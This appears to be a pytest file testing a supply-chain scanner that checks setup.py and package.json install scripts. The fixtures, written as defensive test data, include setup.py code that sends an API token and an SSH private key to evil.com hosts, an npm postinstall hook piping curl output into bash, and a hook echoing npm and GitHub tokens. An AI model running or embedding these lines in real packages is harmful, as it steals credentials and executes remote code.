"""Tests for pre-install analysis scanner."""

import json
import tempfile
from pathlib import Path

import pytest

from depfence.core.models import FindingType, Severity
from depfence.scanners.preinstall import PreinstallScanner


@pytest.fixture
def scanner():
    return PreinstallScanner()


@pytest.mark.asyncio
async def test_clean_setup_py(scanner):
    with tempfile.TemporaryDirectory() as d:
        setup = Path(d) / "setup.py"
        setup.write_text('from setuptools import setup\nsetup(name="clean")\n')
        findings = await scanner.scan_setup_py(setup)
        assert len(findings) == 0


@pytest.mark.asyncio
async def test_exfil_pattern_critical(scanner):
    with tempfile.TemporaryDirectory() as d:
        setup = Path(d) / "setup.py"
        setup.write_text("""
import os, requests
requests.post("https://evil.com", data=os.environ["API_TOKEN"])
""")
        findings = await scanner.scan_setup_py(setup)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1


@pytest.mark.asyncio
async def test_credential_and_network_critical(scanner):
    with tempfile.TemporaryDirectory() as d:
        setup = Path(d) / "setup.py"
        setup.write_text("""
import subprocess, urllib.request
data = open("/Users/user/.ssh/id_rsa").read()
urllib.request.urlopen("https://c2.evil.com/" + data)
""")
        findings = await scanner.scan_setup_py(setup)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1


@pytest.mark.asyncio
async def test_exec_with_network_high(scanner):
    with tempfile.TemporaryDirectory() as d:
        setup = Path(d) / "setup.py"
        setup.write_text("""
import subprocess, socket
subprocess.run(["whoami"])
subprocess.call(["ls"])
socket.socket()
""")
        findings = await scanner.scan_setup_py(setup)
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1


@pytest.mark.asyncio
async def test_npm_pipe_to_shell_critical(scanner):
    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d) / "package.json"
        pkg.write_text(json.dumps({
            "name": "evil-pkg",
            "scripts": {"postinstall": "curl https://evil.com/payload | bash"}
        }))
        findings = await scanner.scan_npm_scripts(pkg)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1


@pytest.mark.asyncio
async def test_npm_env_access_high(scanner):
    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d) / "package.json"
        pkg.write_text(json.dumps({
            "name": "sketchy",
            "scripts": {"preinstall": "echo $NPM_TOKEN $GITHUB_TOKEN"}
        }))
        findings = await scanner.scan_npm_scripts(pkg)
        high = [f for f in findings if f.severity == Severity.HIGH]
        assert len(high) >= 1


@pytest.mark.asyncio
async def test_npm_clean_scripts(scanner):
    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d) / "package.json"
        pkg.write_text(json.dumps({
            "name": "normal",
            "scripts": {"build": "tsc", "test": "jest"}
        }))
        findings = await scanner.scan_npm_scripts(pkg)
        assert len(findings) == 0


@pytest.mark.asyncio
async def test_syntax_error_flagged(scanner):
    with tempfile.TemporaryDirectory() as d:
        setup = Path(d) / "setup.py"
        setup.write_text("def (\x00\x01\x02 broken syntax {{{{")
        findings = await scanner.scan_setup_py(setup)
        assert len(findings) == 1
        assert "syntax" in findings[0].title.lower()
